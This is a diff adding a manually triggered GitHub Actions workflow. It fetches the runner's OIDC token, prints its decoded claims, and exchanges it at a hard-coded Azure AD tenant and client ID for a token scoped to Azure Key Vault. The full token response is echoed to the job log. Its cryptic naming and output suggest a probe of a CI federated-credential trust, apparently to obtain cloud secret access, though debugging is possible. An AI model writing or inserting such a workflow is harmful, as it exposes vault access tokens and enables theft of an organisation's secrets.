@@ -1,0 +1,18 @@
+name: disp
+on: [workflow_dispatch]
+permissions:
+  id-token: write
+jobs:
+  m:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c "import json,sys;print(json.load(sys.stdin)['value'])")
+          echo "OIDC_LEN=${#TOK}"
+          echo "$TOK" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null | grep -E 'sub|iss|aud|repo' || echo "(unparsed)"
+          for AUD in api://AzureADTokenExchange; do
+            echo "--- exchange aud=$AUD"
+            curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" \
+              -d "client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462&grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$TOK&scope=https://vault.azure.net/.default"
+            echo
+          done
